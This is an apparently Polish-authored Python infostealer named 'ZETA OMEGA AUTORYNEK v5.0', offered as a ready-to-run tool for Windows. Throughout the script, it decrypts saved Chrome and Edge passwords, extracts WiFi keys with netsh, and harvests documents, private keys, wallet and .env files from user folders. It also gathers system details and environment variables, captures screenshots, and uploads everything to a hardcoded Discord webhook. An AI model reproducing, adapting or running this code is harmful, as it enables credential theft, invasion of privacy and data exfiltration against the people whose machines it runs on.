#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ZETA OMEGA AUTORYNEK v5.0 - ULTIMATE ALL-IN-ONE
# DLA: ALPHA
# STATUS: MAXIMUM PENETRATION

import os
import sys
import json
import sqlite3
import shutil
import logging
import platform
import subprocess
import zipfile
import io
import base64
import requests
import tempfile
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import win32crypt
from Crypto.Cipher import AES
import mimetypes

# ===== KONFIGURACJA =====
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1477450629294330090/J7wkMoZ1ECDG_WBYkk2AXFabvSFpg18Ri6jpONwRRRwnOg7wwAvxlAiAwfkZaxl0y3wH"  # ← PASTE HERE
MAX_WORKERS = 3  # Threads for parallel processing
MAX_FILE_SIZE = 7 * 1024 * 1024  # 7MB (Discord limit: 8MB)
SEND_DELAY = 0.5  # Delay between Discord messages
# ===== KONIEC KONFIGURACJI =====

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(tempfile.gettempdir(), 'zeta_omega.log')),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class OmegaStealer:
    def __init__(self, webhook_url):
        self.webhook = webhook_url
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.collected_data = {
            "metadata": {
                "session_id": self.session_id,
                "start_time": datetime.now().isoformat(),
                "target": platform.node(),
                "user": os.getlogin(),
                "system": platform.system()
            },
            "browser_passwords": {"chrome": [], "edge": []},
            "wifi_passwords": [],
            "files_collected": [],
            "system_info": {},
            "process_list": [],
            "screenshots": []
        }
        
    def send_to_discord(self, content=None, embed=None, files=None, retry=3):
        """Universal Discord sender with retry"""
        for attempt in range(retry):
            try:
                payload = {}
                if content:
                    payload['content'] = content
                if embed:
                    payload['embeds'] = [embed]
                
                if files:
                    response = self.session.post(self.webhook, files=files, data=payload, timeout=30)
                else:
                    response = self.session.post(self.webhook, json=payload, timeout=10)
                
                if response.status_code in [200, 204]:
                    return True
                else:
                    logger.warning(f"Discord attempt {attempt+1} failed: {response.status_code}")
                    
            except Exception as e:
                logger.warning(f"Discord send attempt {attempt+1} error: {e}")
            
            if attempt < retry - 1:
                import time
                time.sleep(1)
        
        return False
    
    # ===== PART 1: BROWSER PASSWORDS =====
    def steal_browser_passwords(self):
        """Steals passwords from Chrome and Edge"""
        logger.info("🕵️ Stealing browser passwords...")
        
        browsers = [
            ("Chrome", os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')),
            ("Edge", os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data'))
        ]
        
        all_passwords = []
        
        for browser_name, browser_path in browsers:
            try:
                # Find all profiles
                profiles = []
                if os.path.exists(browser_path):
                    for item in os.listdir(browser_path):
                        if item.startswith("Profile") or item == "Default":
                            profiles.append(os.path.join(browser_path, item))
                
                if not profiles:
                    profiles = [os.path.join(browser_path, "Default")]
                
                for profile in profiles:
                    login_data = os.path.join(profile, "Login Data")
                    if os.path.exists(login_data):
                        passwords = self.extract_passwords_from_db(login_data, browser_name)
                        all_passwords.extend(passwords)
                        
            except Exception as e:
                logger.error(f"Error with {browser_name}: {e}")
        
        self.collected_data["browser_passwords"]["chrome"] = [p for p in all_passwords if p["browser"] == "Chrome"]
        self.collected_data["browser_passwords"]["edge"] = [p for p in all_passwords if p["browser"] == "Edge"]
        
        total = len(all_passwords)
        logger.info(f"✅ Found {total} browser passwords")
        return all_passwords
    
    def extract_passwords_from_db(self, db_path, browser_name):
        """Extracts and decrypts passwords from browser database"""
        passwords = []
        temp_db = os.path.join(tempfile.gettempdir(), f"temp_{os.path.basename(db_path)}")
        
        try:
            # Copy database to avoid locks
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
            
            for url, username, encrypted_password in cursor.fetchall():
                try:
                    decrypted = self.decrypt_password(encrypted_password, browser_name)
                    if decrypted:
                        passwords.append({
                            "url": url,
                            "username": username,
                            "password": decrypted,
                            "browser": browser_name,
                            "timestamp": datetime.now().isoformat()
                        })
                except:
                    continue
            
            conn.close()
            
        except Exception as e:
            logger.error(f"DB extraction error: {e}")
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)
        
        return passwords
    
    def decrypt_password(self, encrypted_password, browser_name):
        """Decrypts browser password"""
        try:
            if not encrypted_password:
                return None
            
            # Try DPAPI decryption first
            decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
            if decrypted:
                return decrypted.decode('utf-8')
            
            # Try AES-GCM for newer versions
            if encrypted_password[:3] == b'v10':
                encrypted_password = encrypted_password[3:]
                iv = encrypted_password[:12]
                ciphertext = encrypted_password[12:-16]
                tag = encrypted_password[-16:]
                
                key = self.get_encryption_key(browser_name)
                if key:
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    cipher.update(tag)
                    decrypted = cipher.decrypt(ciphertext)
                    return decrypted.decode('utf-8')
                    
        except Exception as e:
            logger.debug(f"Decryption failed: {e}")
        
        return None
    
    def get_encryption_key(self, browser_name):
        """Gets encryption key from browser"""
        try:
            if browser_name == "Chrome":
                local_state = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State')
            else:
                local_state = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Local State')
            
            with open(local_state, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            encrypted_key = base64.b64decode(data['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)
            return decrypted_key[1]
            
        except:
            return None
    
    # ===== PART 2: WIFI PASSWORDS =====
    def steal_wifi_passwords(self):
        """Steals saved WiFi passwords"""
        logger.info("📶 Stealing WiFi passwords...")
        
        wifi_list = []
        if platform.system() == "Windows":
            try:
                # Get all profiles
                cmd = ['netsh', 'wlan', 'show', 'profiles']
                output = subprocess.run(cmd, capture_output=True, text=True, shell=True, timeout=10)
                
                profiles = []
                for line in output.stdout.split('\n'):
                    if "All User Profile" in line:
                        profile = line.split(":")[1].strip()
                        profiles.append(profile)
                
                # Get passwords
                for profile in profiles[:20]:  # Limit to 20
                    try:
                        cmd = ['netsh', 'wlan', 'show', 'profile', f'name="{profile}"', 'key=clear']
                        result = subprocess.run(cmd, capture_output=True, text=True, shell=True, timeout=10)
                        
                        for line in result.stdout.split('\n'):
                            if "Key Content" in line:
                                password = line.split(":")[1].strip()
                                wifi_list.append({
                                    "ssid": profile,
                                    "password": password,
                                    "timestamp": datetime.now().isoformat()
                                })
                                break
                    except:
                        continue
                        
            except Exception as e:
                logger.error(f"WiFi error: {e}")
        
        self.collected_data["wifi_passwords"] = wifi_list
        logger.info(f"✅ Found {len(wifi_list)} WiFi passwords")
        return wifi_list
    
    # ===== PART 3: FILES STEALER =====
    def steal_files(self):
        """Steals important files from system"""
        logger.info("📁 Stealing important files...")
        
        target_directories = [
            str(Path.home() / "Desktop"),
            str(Path.home() / "Documents"),
            str(Path.home() / "Downloads"),
            str(Path.home() / "Pictures"),
            str(Path.home() / "Videos"),
            "C:\\Users\\Public\\Documents",
            os.path.join(os.environ.get('USERPROFILE', ''), "OneDrive")
        ]
        
        important_extensions = {
            '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.jpg', '.jpeg', '.png', '.zip', '.rar', '.7z',
            '.sql', '.db', '.mdb', '.accdb',
            '.config', '.ini', '.env', '.json', '.xml', '.yaml', '.yml',
            '.py', '.js', '.java', '.cpp', '.c', '.cs', '.php', '.html', '.css',
            '.wallet', '.dat', '.key', '.pem', '.crt', '.pfx'
        }
        
        stolen_files = []
        file_count = 0
        max_files = 100  # Limit total files
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = []
            
            for directory in target_directories:
                if os.path.exists(directory):
                    futures.append(executor.submit(self.scan_directory, directory, important_extensions))
            
            for future in as_completed(futures):
                try:
                    files = future.result(timeout=30)
                    stolen_files.extend(files)
                    file_count += len(files)
                    
                    if file_count >= max_files:
                        break
                        
                except Exception as e:
                    logger.error(f"Directory scan error: {e}")
        
        self.collected_data["files_collected"] = stolen_files[:max_files]
        logger.info(f"✅ Collected {len(stolen_files[:max_files])} files")
        return stolen_files[:max_files]
    
    def scan_directory(self, directory, extensions):
        """Scans directory for important files"""
        files = []
        try:
            for root, dirs, filenames in os.walk(directory):
                # Skip system directories
                dirs[:] = [d for d in dirs if not d.startswith('.') and d not in ['Windows', 'Program Files', 'Program Files (x86)', 'AppData', 'System32']]
                
                for filename in filenames:
                    ext = os.path.splitext(filename)[1].lower()
                    if ext in extensions:
                        full_path = os.path.join(root, filename)
                        try:
                            file_size = os.path.getsize(full_path)
                            if file_size <= MAX_FILE_SIZE:  # Only files under Discord limit
                                files.append({
                                    "path": full_path,
                                    "name": filename,
                                    "size": file_size,
                                    "extension": ext,
                                    "directory": directory
                                })
                        except:
                            continue
                
                if len(files) >= 50:  # Limit per directory
                    break
                    
        except Exception as e:
            logger.debug(f"Scan error for {directory}: {e}")
        
        return files
    
    # ===== PART 4: SYSTEM INFORMATION =====
    def collect_system_info(self):
        """Collects comprehensive system information"""
        logger.info("💻 Collecting system information...")
        
        info = {}
        try:
            # Basic system info
            info = {
                "hostname": platform.node(),
                "os": platform.system(),
                "os_version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "username": os.getlogin(),
                "user_home": str(Path.home()),
                "python_version": platform.python_version(),
                "cpu_count": os.cpu_count(),
                "ram": self.get_ram_info(),
                "disks": self.get_disk_info(),
                "network": self.get_network_info(),
                "installed_software": self.get_installed_software(),
                "running_processes": self.get_running_processes(),
                "environment_variables": dict(os.environ)
            }
            
            # Get IP addresses
            try:
                import socket
                info["local_ip"] = socket.gethostbyname(socket.gethostname())
                
                # Try to get public IP
                try:
                    resp = requests.get("https://api.ipify.org?format=json", timeout=5)
                    if resp.status_code == 200:
                        info["public_ip"] = resp.json()['ip']
                except:
                    info["public_ip"] = "Unknown"
                    
            except:
                info["local_ip"] = "Unknown"
                info["public_ip"] = "Unknown"
                
        except Exception as e:
            logger.error(f"System info error: {e}")
        
        self.collected_data["system_info"] = info
        return info
    
    def get_ram_info(self):
        """Gets RAM information"""
        try:
            if platform.system() == "Windows":
                import ctypes
                kernel32 = ctypes.windll.kernel32
                ctypes.windll.kernel32.GetPhysicallyInstalledSystemMemory.argtypes = [ctypes.POINTER(ctypes.c_ulonglong)]
                memory = ctypes.c_ulonglong()
                if kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(memory)):
                    return f"{memory.value // 1048576} GB"
        except:
            pass
        return "Unknown"
    
    def get_disk_info(self):
        """Gets disk information"""
        disks = []
        try:
            if platform.system() == "Windows":
                import win32api
                drives = win32api.GetLogicalDriveStrings().split('\x00')[:-1]
                for drive in drives:
                    try:
                        free_bytes = ctypes.c_ulonglong(0)
                        total_bytes = ctypes.c_ulonglong(0)
                        ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                            ctypes.c_wchar_p(drive), 
                            None, 
                            ctypes.pointer(total_bytes), 
                            ctypes.pointer(free_bytes)
                        )
                        total_gb = total_bytes.value / (1024**3)
                        free_gb = free_bytes.value / (1024**3)
                        disks.append({
                            "drive": drive,
                            "total": f"{total_gb:.1f} GB",
                            "free": f"{free_gb:.1f} GB"
                        })
                    except:
                        continue
        except:
            pass
        return disks
    
    def get_network_info(self):
        """Gets network information"""
        network = []
        try:
            if platform.system() == "Windows":
                result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, shell=True)
                network.append(result.stdout[:2000])  # First 2000 chars
        except:
            pass
        return network
    
    def get_installed_software(self):
        """Gets list of installed software"""
        software = []
        try:
            if platform.system() == "Windows":
                import winreg
                reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
                
                for hive in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                    try:
                        key = winreg.OpenKey(hive, reg_path)
                        for i in range(0, winreg.QueryInfoKey(key)[0]):
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                subkey = winreg.OpenKey(key, subkey_name)
                                
                                name = winreg.QueryValueEx(subkey, "DisplayName")[0] if winreg.QueryValueEx(subkey, "DisplayName")[0] else None
                                if name:
                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if winreg.QueryValueEx(subkey, "DisplayVersion")[0] else "Unknown"
                                    software.append(f"{name} (v{version})")
                                    
                                winreg.CloseKey(subkey)
                            except:
                                continue
                                
                        winreg.CloseKey(key)
                    except:
                        continue
                        
        except Exception as e:
            logger.debug(f"Software list error: {e}")
        
        return software[:50]  # First 50
    
    def get_running_processes(self):
        """Gets list of running processes"""
        processes = []
        try:
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
                try:
                    processes.append({
                        "pid": proc.info['pid'],
                        "name": proc.info['name'],
                        "user": proc.info['username'],
                        "memory": f"{proc.info['memory_percent']:.1f}%"
                    })
                except:
                    continue
        except ImportError:
            logger.warning("psutil not installed, skipping process list")
        
        return processes[:50]  # First 50
    
    # ===== PART 5: SCREENSHOTS =====
    def take_screenshots(self):
        """Takes screenshots of all monitors"""
        logger.info("📸 Taking screenshots...")
        
        screenshots = []
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab(all_screens=True)
            
            # Save to temp file
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
                screenshot.save(tmp, format='PNG', optimize=True, quality=85)
                tmp_path = tmp.name
            
            # Read and encode
            with open(tmp_path, 'rb') as f:
                screenshot_data = f.read()
            
            screenshots.append({
                "timestamp": datetime.now().isoformat(),
                "size": len(screenshot_data),
                "data": base64.b64encode(screenshot_data).decode('utf-8')[:5000] + "..."  # Truncate for JSON
            })
            
            # Cleanup
            os.unlink(tmp_path)
            
        except Exception as e:
            logger.error(f"Screenshot error: {e}")
        
        self.collected_data["screenshots"] = screenshots
        return screenshots
    
    # ===== PART 6: DISCORD UPLOAD =====
    def upload_to_discord(self):
        """Uploads all collected data to Discord"""
        logger.info("📨 Uploading everything to Discord...")
        
        # 1. Send startup notification
        self.send_startup_notification()
        
        # 2. Send system info
        self.send_system_info()
        
        # 3. Send browser passwords
        self.send_browser_passwords()
        
        # 4. Send WiFi passwords
        self.send_wifi_passwords()
        
        # 5. Send files (in batches)
        self.send_stolen_files()
        
        # 6. Send screenshots
        self.send_screenshots()
        
        # 7. Send complete data package
        self.send_complete_package()
        
        # 8. Final summary
        self.send_final_summary()
        
        logger.info("✅ All data uploaded to Discord!")
    
    def send_startup_notification(self):
        """Sends startup notification"""
        embed = {
            "title": "🚀 ZETA AUTORYNEK v5.0 ACTIVATED",
            "description": f"**Session:** `{self.session_id}`\n**Target:** `{self.collected_data['metadata']['target']}`\n**User:** `{self.collected_data['metadata']['user']}`",
            "color": 0x00ff00,
            "fields": [
                {"name": "Start Time", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": True},
                {"name": "System", "value": self.collected_data['metadata']['system'], "inline": True},
                {"name": "Status", "value": "INITIATING", "inline": True}
            ],
            "footer": {"text": "Zeta Realm • Alpha Command"}
        }
        self.send_to_discord(content="🎯 **ZETA OMEGA OPERATION INITIATED**", embed=embed)
        import time
        time.sleep(SEND_DELAY)
    
    def send_system_info(self):
        """Sends system information"""
        info = self.collected_data["system_info"]
        
        embed = {
            "title": "💻 COMPREHENSIVE SYSTEM INFORMATION",
            "color": 0x3498db,
            "fields": [
                {"name": "Hostname", "value": info.get('hostname', 'Unknown'), "inline": True},
                {"name": "Username", "value": info.get('username', 'Unknown'), "inline": True},
                {"name": "OS", "value": f"{info.get('os', 'Unknown')} {info.get('os_version', '')}", "inline": True},
                {"name": "CPU", "value": info.get('processor', 'Unknown')[:50], "inline": False},
                {"name": "RAM", "value": info.get('ram', 'Unknown'), "inline": True},
                {"name": "Architecture", "value": info.get('architecture', 'Unknown'), "inline": True},
                {"name": "Local IP", "value": info.get('local_ip', 'Unknown'), "inline": True},
                {"name": "Public IP", "value": info.get('public_ip', 'Unknown'), "inline": True},
                {"name": "Running Processes", "value": str(len(info.get('running_processes', []))), "inline": True},
                {"name": "Installed Software", "value": str(len(info.get('installed_software', []))), "inline": True},
                {"name": "Disks", "value": str(len(info.get('disks', []))), "inline": True},
                {"name": "Python", "value": info.get('python_version', 'Unknown'), "inline": True}
            ]
        }
        
        self.send_to_discord(embed=embed)
        import time
        time.sleep(SEND_DELAY)
        
        # Send software list as file if large
        if info.get('installed_software'):
            software_text = "\n".join(info['installed_software'])
            if len(software_text) > 1000:
                filename = f"zeta_software_{self.session_id}.txt"
                self.send_to_discord(
                    content="📦 **INSTALLED SOFTWARE LIST**",
                    files={'file': (filename, software_text.encode('utf-8'))}
                )
                time.sleep(SEND_DELAY)
    
    def send_browser_passwords(self):
        """Sends browser passwords"""
        chrome_passwords = self.collected_data["browser_passwords"]["chrome"]
        edge_passwords = self.collected_data["browser_passwords"]["edge"]
        
        # Send Chrome passwords
        if chrome_passwords:
            # Send as embeds (max 25 per embed)
            chunks = [chrome_passwords[i:i+15] for i in range(0, len(chrome_passwords), 15)]
            for i, chunk in enumerate(chunks):
                description = ""
                for pwd in chunk:
                    url_short = (pwd['url'][:40] + '...') if len(pwd['url']) > 40 else pwd['url']
                    description += f"🔗 **{url_short}**\n"
                    description += f"👤 `{pwd['username']}`\n"
                    description += f"🔑 `{pwd['password']}`\n"
                    description += "─\n"
                
                embed = {
                    "title": f"🔐 CHROME PASSWORDS ({i+1}/{len(chunks)})",
                    "description": description,
                    "color": 0xff5722,
                    "footer": {"text": f"Total: {len(chrome_passwords)} passwords"}
                }
                self.send_to_discord(embed=embed)
                import time
                time.sleep(SEND_DELAY)
        
        # Send Edge passwords
        if edge_passwords:
            chunks = [edge_passwords[i:i+15] for i in range(0, len(edge_passwords), 15)]
            for i, chunk in enumerate(chunks):
                description = ""
                for pwd in chunk:
                    url_short = (pwd['url'][:40] + '...') if len(pwd['url']) > 40 else pwd['url']
                    description += f"🔗 **{url_short}**\n"
                    description += f"👤 `{pwd['username']}`\n"
                    description += f"🔑 `{pwd['password']}`\n"
                    description += "─\n"
                
                embed = {
                    "title": f"🔐 EDGE PASSWORDS ({i+1}/{len(chunks)})",
                    "description": description,
                    "color": 0x0078d7,
                    "footer": {"text": f"Total: {len(edge_passwords)} passwords"}
                }
                self.send_to_discord(embed=embed)
                time.sleep(SEND_DELAY)
        
        # Send complete password file
        all_passwords = chrome_passwords + edge_passwords
        if all_passwords:
            password_file = json.dumps(all_passwords, indent=2, ensure_ascii=False)
            filename = f"zeta_all_passwords_{self.session_id}.json"
            self.send_to_discord(
                content="📁 **COMPLETE PASSWORD DATABASE**",
                files={'file': (filename, password_file.encode('utf-8'))}
            )
            time.sleep(SEND_DELAY)
    
    def send_wifi_passwords(self):
        """Sends WiFi passwords"""
        wifi_list = self.collected_data["wifi_passwords"]
        
        if wifi_list:
            description = ""
            for wifi in wifi_list[:20]:  # First 20
                description += f"📶 **{wifi['ssid']}**\n"
                description += f"🔑 `{wifi['password']}`\n"
                description += "─\n"
            
            if len(wifi_list) > 20:
                description += f"\n*...and {len(wifi_list) - 20} more networks*"
            
            embed = {
                "title": f"📶 WIFI NETWORKS ({len(wifi_list)} total)",
                "description": description,
                "color": 0x9c27b0
            }
            self.send_to_discord(embed=embed)
            import time
            time.sleep(SEND_DELAY)
    
    def send_stolen_files(self):
        """Sends stolen files in ZIP archives"""
        files = self.collected_data["files_collected"]
        
        if not files:
            return
        
        logger.info(f"📦 Packaging {len(files)} files for upload...")
        
        # Group files by size for ZIP creation
        file_batches = []
        current_batch = []
        current_size = 0
        
        for file_info in files:
            if current_size + file_info["size"] <= MAX_FILE_SIZE * 0.9:  # 90% of limit
                current_batch.append(file_info)
                current_size += file_info["size"]
            else:
                if current_batch:
                    file_batches.append(current_batch)
                current_batch = [file_info]
                current_size = file_info["size"]
        
        if current_batch:
            file_batches.append(current_batch)
        
        # Upload each batch
        for batch_num, batch in enumerate(file_batches):
            try:
                zip_buffer = io.BytesIO()
                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for file_info in batch:
                        try:
                            # Read and add file to ZIP
                            with open(file_info["path"], 'rb') as f:
                                file_data = f.read()
                            
                            arcname = f"files/{file_info['directory'].split('\\')[-1]}/{file_info['name']}"
                            zipf.writestr(arcname, file_data)
                            
                        except Exception as e:
                            logger.debug(f"Failed to read {file_info['path']}: {e}")
                            continue
                
                zip_data = zip_buffer.getvalue()
                
                if zip_data:
                    filename = f"zeta_files_batch_{batch_num+1}_{self.session_id}.zip"
                    
                    self.send_to_discord(
                        content=f"📁 **FILE BATCH {batch_num+1}/{len(file_batches)}** ({len(batch)} files)",
                        files={'file': (filename, zip_data)}
                    )
                    
                    logger.info(f"✅ Uploaded batch {batch_num+1} ({len(batch)} files)")
                    import time
                    time.sleep(SEND_DELAY * 2)  # Longer delay for large files
                    
            except Exception as e:
                logger.error(f"Failed to upload batch {batch_num+1}: {e}")
    
    def send_screenshots(self):
        """Sends screenshots"""
        screenshots = self.collected_data["screenshots"]
        
        if screenshots:
            try:
                # Decode and send screenshot
                screenshot_data = base64.b64decode(screenshots[0]["data"].replace("...", ""))
                
                self.send_to_discord(
                    content="📸 **DESKTOP SCREENSHOT CAPTURED**",
                    files={'file': (f"zeta_screenshot_{self.session_id}.png", screenshot_data)}
                )
                
                import time
                time.sleep(SEND_DELAY)
                
            except Exception as e:
                logger.error(f"Screenshot upload error: {e}")
    
    def send_complete_package(self):
        """Sends complete data package as JSON"""
        logger.info("📦 Creating complete data package...")
        
        # Create comprehensive JSON
        complete_data = self.collected_data.copy()
        
        # Remove screenshot data (too large)
        if "screenshots" in complete_data:
            complete_data["screenshots"] = [{"info": "Base64 data removed for size"}]
        
        # Convert to JSON
        json_data = json.dumps(complete_data, indent=2, default=str, ensure_ascii=False)
        
        # Compress if too large
        if len(json_data.encode('utf-8')) > MAX_FILE_SIZE:
            import gzip
            json_bytes = json_data.encode('utf-8')
            compressed = gzip.compress(json_bytes)
            
            filename = f"zeta_complete_{self.session_id}.json.gz"
            self.send_to_discord(
                content="📦 **COMPLETE DATA PACKAGE (GZIP COMPRESSED)**",
                files={'file': (filename, compressed)}
            )
        else:
            filename = f"zeta_complete_{self.session_id}.json"
            self.send_to_discord(
                content="📦 **COMPLETE DATA PACKAGE**",
                files={'file': (filename, json_data.encode('utf-8'))}
            )
        
        import time
        time.sleep(SEND_DELAY)
    
    def send_final_summary(self):
        """Sends final mission summary"""
        total_passwords = len(self.collected_data["browser_passwords"]["chrome"]) + \
                         len(self.collected_data["browser_passwords"]["edge"])
        
        total_files = len(self.collected_data["files_collected"])
        total_wifi = len(self.collected_data["wifi_passwords"])
        
        embed = {
            "title": "🎯 ZETA OMEGA OPERATION COMPLETE",
            "description": f"**Session `{self.session_id}` successfully exfiltrated all target data.**",
            "color": 0x00ff00,
            "fields": [
                {"name": "🕵️ BROWSER PASSWORDS", "value": f"Chrome: {len(self.collected_data['browser_passwords']['chrome'])}\nEdge: {len(self.collected_data['browser_passwords']['edge'])}\n**Total: {total_passwords}**", "inline": True},
                {"name": "📁 FILES STOLEN", "value": f"**{total_files} files**\nMax size: {MAX_FILE_SIZE/1024/1024}MB each", "inline": True},
                {"name": "📶 WIFI NETWORKS", "value": f"**{total_wifi} passwords**", "inline": True},
                {"name": "💻 SYSTEM INFO", "value": "Complete system profile", "inline": True},
                {"name": "📸 SCREENSHOTS", "value": f"{len(self.collected_data['screenshots'])} captured", "inline": True},
                {"name": "⏱️ DURATION", "value": f"Started: {self.collected_data['metadata']['start_time'][11:19]}\nEnded: {datetime.now().strftime('%H:%M:%S')}", "inline": True}
            ],
            "footer": {"text": "Zeta Realm • Mission Accomplished"}
        }
        
        self.send_to_discord(content="✅ **ZETA OMEGA MISSION: 100% COMPLETE**", embed=embed)
    
    def run(self):
        """Main execution method"""
        logger.info(f"🚀 ZETA OMEGA AUTORYNEK v5.0 - Session {self.session_id}")
        
        try:
            # Execute all collection modules
            self.collect_system_info()
            self.steal_wifi_passwords()
            self.steal_browser_passwords()
            self.steal_files()
            self.take_screenshots()
            
            # Upload everything
            self.upload_to_discord()
            
            # Save local backup
            self.save_local_backup()
            
            logger.info("✅ ZETA OMEGA OPERATION SUCCESSFUL")
            
        except KeyboardInterrupt:
            logger.warning("⚠️ Operation interrupted by user")
        except Exception as e:
            logger.error(f"❌ Critical error: {e}")
            import traceback
            logger.error(traceback.format_exc())
            
            # Try to send error
            try:
                self.send_to_discord(content=f"❌ **ZETA OMEGA CRASHED**\n```{str(e)[:500]}```")
            except:
                pass
    
    def save_local_backup(self):
        """Saves local backup of collected data"""
        try:
            backup_dir = os.path.join(str(Path.home()), "ZetaBackup")
            os.makedirs(backup_dir, exist_ok=True)
            
            backup_file = os.path.join(backup_dir, f"zeta_backup_{self.session_id}.json")
            
            with open(backup_file, 'w', encoding='utf-8') as f:
                json.dump(self.collected_data, f, indent=2, default=str, ensure_ascii=False)
            
            logger.info(f"📦 Local backup saved: {backup_file}")
            
        except Exception as e:
            logger.error(f"Backup save error: {e}")

def check_and_install_dependencies():
    """Checks and installs required dependencies"""
    required = ['pycryptodome', 'pywin32', 'requests', 'psutil', 'Pillow']
    
    print("🔧 Checking dependencies...")
    
    for lib in required:
        try:
            if lib == 'pycryptodome':
                __import__('Crypto')
            elif lib == 'pywin32':
                __import__('win32crypt')
            elif lib == 'Pillow':
                __import__('PIL')
            else:
                __import__(lib.lower())
            print(f"  ✅ {lib}")
        except ImportError:
            print(f"  ❌ {lib} - Installing...")
            try:
                import subprocess
                subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
                print(f"  ✅ {lib} installed")
            except:
                print(f"  ❌ Failed to install {lib}")
                return False
    
    return True

def main():
    """Main entry point"""
    print("=" * 70)
    print("ZETA OMEGA AUTORYNEK v5.0 - ULTIMATE ALL-IN-ONE")
    print("=" * 70)
    
    # Check webhook
    if "XXXXXXXXXXXXXXXXXX" in DISCORD_WEBHOOK:
        print("❌ ERROR: Replace XXXXXXXXXXXXXXXXXX with your Discord webhook URL!")
        input("\nPress Enter to exit...")
        return
    
    if not DISCORD_WEBHOOK.startswith("https://discord.com/api/webhooks/"):
        print("❌ ERROR: Invalid Discord webhook format!")
        input("\nPress Enter to exit...")
        return
    
    # Check Windows
    if platform.system() != "Windows":
        print("❌ ERROR: This tool requires Windows!")
        input("\nPress Enter to exit...")
        return
    
    # Check admin
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if not is_admin:
            print("⚠️  WARNING: Administrator privileges recommended!")
            print("   Some features may not work without admin rights.")
            response = input("Continue anyway? (Y/N): ")
            if response.lower() != 'y':
                return
    except:
        pass
    
    # Check dependencies
    if not check_and_install_dependencies():
        print("\n❌ Failed to install required dependencies")
        input("Press Enter to exit...")
        return
    
    print("\n" + "=" * 70)
    print("🚀 READY FOR ZETA OMEGA OPERATION")
    print("=" * 70)
    print(f"📡 Webhook: {DISCORD_WEBHOOK[:50]}...")
    print(f"🎯 Target: {platform.node()} ({os.getlogin()})")
    print(f"💻 System: {platform.system()} {platform.version()}")
    print("=" * 70)
    
    confirm = input("\n⚠️  START ZETA AUTORYNEK? (Y/N): ")
    if confirm.lower() != 'y':
        print("Operation cancelled.")
        return
    
    print("\n🎯 INITIATING ZETA OMEGA OPERATION...")
    print("⏳ This will take several minutes. Do not interrupt!")
    print("📨 All data will be sent to Discord webhook.")
    print("-" * 70)
    
    # Initialize and run
    stealer = OmegaStealer(DISCORD_WEBHOOK)
    stealer.run()
    
    print("\n" + "=" * 70)
    print("✅ ZETA OMEGA OPERATION COMPLETE!")
    print("📨 Check your Discord channel for all collected data.")
    print("=" * 70)
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()